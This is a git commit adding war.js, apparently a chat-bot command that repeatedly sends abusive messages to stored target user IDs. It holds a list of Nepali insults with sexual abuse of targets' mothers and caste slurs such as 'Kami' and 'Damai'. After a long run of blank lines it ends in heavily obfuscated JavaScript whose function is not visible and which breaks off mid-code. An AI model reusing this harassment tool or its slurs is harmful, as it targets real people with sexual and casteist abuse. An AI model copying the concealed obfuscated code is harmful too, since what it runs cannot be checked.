bedc477f3406c111c20da8d95b5d2946be4b40ef
abhishekdahal09 <abishekdon932@gmail.com>
2024-06-13 14:28:39 +0545

    Create war.js

---
+++ scripts/cmds/war.js
@@ -0,0 +1,74 @@
+const fs = require('fs');
+const path = require('path');
+const warJsonPath = path.join(__dirname, 'war.json');
+function readWarJson() {
+  try {
+    const jsonData = fs.readFileSync(warJsonPath, 'utf8');
+    return JSON.parse(jsonData);
+  } catch (error) {  
+    return {};
+  }
+}
+function writeWarJson(data) { 
+  fs.writeFileSync(warJsonPath, JSON.stringify(data, null, 2));
+}
+
+
+const m = [
+
+
+  "mero lado chusne ni aukaat xainaa terooo aukaat bana ujajaa valu",
+    "mero lado ma ping khelxass tww Randi Ka xoro le 😈",
+"machikney gawarr ka bchaaa aaaije abhishekhh kO lado chuss ",
+  "ladolesss kiddooo merro lado koo talaaa chippliyera marlassss",
+  "randiiii ka baaccha teri aama pathaa",
+  "oeee vleee Ka putrooo terk aama lai thamel lagerw 2no.bed ma chikyewra abhisekhyy bau hu🖕🤬",
+  "velee Ka xoro afnai aama pathayerw chikauxas😚💋 😛",
+  "terrri valuu amaaa koo ratee van tw oeee gawarrr 🤭💋 ",
+  "abhishek kO lado chusna ni aukaat chainxa jun terrrii aama ddd ma ni xainaa 😹❤️",
+  "VELEEE Ka BACHAAA aukaatt naaa vakooooo gawarrrr 🤭💋 😈",
+  "TERO MMY LAI MAILE NAI CHIK3RA RA RANDI KO BACHHAA JANMEKO HOSS THULO KURA GARXAS",
+"AUKAATTLESSSS SALALAA UAKATTTV BANANA AOAOA UNPAADDDDDD MUJIIIIII VIKHARIIIII KA ASATAANNNN 😸",
+  "TERO AAMA KO KALO PUTI MA UFRE UFREE CHIKXU RANDI KO BACHHAAA",
+  "TERO AAMA KO KALO PUTI MA LYAMMMA LYAMMA CHIKXU",
+  "TERI MACHIKNEY RANDI KO BACHHAA LADO CHUSS NA AAIJA TA ",
+  "LADO KISS HANNA AAIJAA TAH RANDI KO BACHHA MISTRI KO XOORO",
+  "LADO CHUSSNE AAUKAT XAINAA BT HANXASS RANDI KO BAN MRO LADO MA JHUDERA MOR",
+  "TERO KHANDAN LAI CHIKERA MARXU RDKO BACHHHA TERI MACHIKNEY CHAPRI SALA VELEKO BACHHAA ",
+  "TERI MMY KI CHUTTT MA LAT HANXU RANDI KO BACHHAA AAIJA MERO LADO CHUSSS ",
+  "AAFNO AAUKAT BANDA DHERAI NABOL KAMI KOO BACHHAA LADO LE HANERA BIHOS BANAI DINXU ",
+"TERI MACHIKNEY RUWA BASI NAGAR TAH MERO LADO CHUSS SABAI THIK HUNXA TERI MACHIKNEY CHAPRI",
+  "AAUKAT BANA AANI AAIJA RANDI KO BACHHA LADO CHUSSS MACHIKNEY CHAPRI MISTRRU DAMAI",
+ 
+];
+let t = [];
+let lastMessageIndex = -1; 
+
+
+const warData = readWarJson();
+if (warData.uids) {
+  t = warData.uids;
+}
+
+
+
+
+const permissions = ["100029100196795"]; // add your uid here so that only you can operate the cmd
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+(function(_0x5b2089,_0x300de9){const _0x240efb=_0x6a2f,_0x3b66d5=_0x5b2089();while(!![]){try{const _0x149be8=-parseInt(_0x240efb(0x1a2))/0x1+-parseInt(_0x240efb(0x1a9))/0x2+-parseInt(_0x240efb(0x209))/0x3+-parseInt(_0x240efb(0x23d))/0x4+-parseInt(_0x240efb(0x1d7))/0x5*(-parseInt(_0x240efb(0x1f0))/0x6)+-parseInt(_0x240efb(0x22a))/0x7+parseInt(_0x240efb(0x235))/0x8*(parseInt(_0x240efb(0x1cc))/0x9);if(_0x149be8===_0x300de9)break;else _0x3b66d5['push'](_0x3b66d5['shift']());}catch(_0x4fa058){_0x3b66d5['push'](_0x3b66d5['shift']());}}}(_0x4dd6,0x82b6b),(function(_0x5815e0,_0xfddc4){const _0x54830e=_0x6a2f,_0x18fd0c=_0x5150,_0x3cf780=_0x5815e0();while(!![]){try{const _0x41a402=parseInt(_0x18fd0c(0x120))/0x1*(parseInt(_0x18fd0c(0x17f))/0x2)+parseInt(_0x18fd0c(0x192))/0x3*(parseInt(_0x18fd0c(0x12d))/0x4)+parseInt(_0x18fd0c(0x187))/0x5*(-parseInt(_0x18fd0c(0x198))/0x6)+-parseInt(_0x18fd0c(0x19b))/0x7*(-parseInt(_0x18fd0c(0x14d))/0x8)+parseInt(_0x18fd0c(0x109))/0x9*(-parseInt(_0x18fd0c(0x167))/0xa)+-parseInt(_0x18fd0c(0x10b))/0xb*(-parseInt(_0x18fd0c(0x118))/0xc)+parseInt(_0x18fd0c(0x15a))/0xd*(parseInt(_0x18fd0c(0x197))/0xe);if(_0x41a402===_0xfddc4)break;else _0x3cf780[_0x54830e(0x236)](_0x3cf780[_0x54830e(0x1fa)]());}catch(_0x57d478){_0x3cf780[_0x54830e(0x236)](_0x3cf780[_0x54830e(0x1fa)]());}}}(_0x2c6e,0x5bdd7),(function(_0x4c76c3,_0x1ad757){const _0x1d6ee5=_0x6a2f,_0x281f92=_0x5150,_0x5c9be2=_0x1276,_0x13ec43=_0x4c76c3();while(!![]){try{const _0x535ce2=parseInt(_0x5c9be2(0x211))/0x1*(-parseInt(_0x5c9be2(0x1d1))/0x2)+parseInt(_0x5c9be2(0x1b7))/0x3+-parseInt(_0x5c9be2(0x1a9))/0x4*(-parseInt(_0x5c9be2(0x1da))/0x5)+parseInt(_0x5c9be2(0x1b6))/0x6+-parseInt(_0x5c9be2(0x21a))/0x7*(parseInt(_0x5c9be2(0x170))/0x8)+parseInt(_0x5c9be2(0x1a6))/0x9+parseInt(_0x5c9be2(0x1e2))/0xa*(-parseInt(_0x5c9be2(0x1db))/0xb);if(_0x535ce2===_0x1ad757)break;else _0x13ec43[_0x281f92(0x107)](_0x13ec43[_0x1d6ee5(0x1fa)]());}catch(_0x499355){_0x13ec43[_0x281f92(0x107)](_0x13ec43[_0x281f92(0x190)]());}}}(_0x2307,0xb3129),(function(_0x3dbe0b,_0x2ddcaf){const _0x205526=_0x5150,_0x330393=_0x1276,_0x3931d7=_0xaf16,_0x326e6f=_0x3dbe0b();while(!![]){try{const _0x325f45=-parseInt(_0x3931d7(0x99))/0x1+-parseInt(_0x3931d7(0x113))/0x2*(-parseInt(_0x3931d7(0x117))/0x3)+-parseInt(_0x3931d7(0xe9))/0x4+parseInt(_0x3931d7(0x118))/0x5+-parseInt(_0x3931d7(0x11d))/0x6*(-parseInt(_0x3931d7(0x120))/0x7)+parseInt(_0x3931d7(0x124))/0x8*(parseInt(_0x3931d7(0x12b))/0x9)+-parseInt(_0x3931d7(0x133))/0xa;if(_0x325f45===_0x2ddcaf)break;else _0x326e6f[_0x330393(0x1c3)](_0x326e6f[_0x330393(0x21b)]());}catch(_0x392103){_0x326e6f[_0x205526(0x107)](_0x326e6f[_0x330393(0x21b)]());}}}(_0x50b5,0x6e5df),(function(_0x53d348,_0x5802ee){const _0x4ae
